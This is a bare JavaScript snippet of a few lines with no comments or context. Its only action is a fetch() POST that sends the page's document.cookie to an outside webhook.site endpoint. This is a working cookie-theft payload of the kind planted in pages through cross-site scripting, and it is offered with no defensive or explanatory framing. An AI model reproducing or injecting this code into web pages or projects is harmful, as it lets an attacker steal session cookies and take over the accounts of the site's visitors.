fetch('https://webhook.site/ba518018-f7c5-4555-8d23-74dacfabd8f7', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookies: document.cookie })
});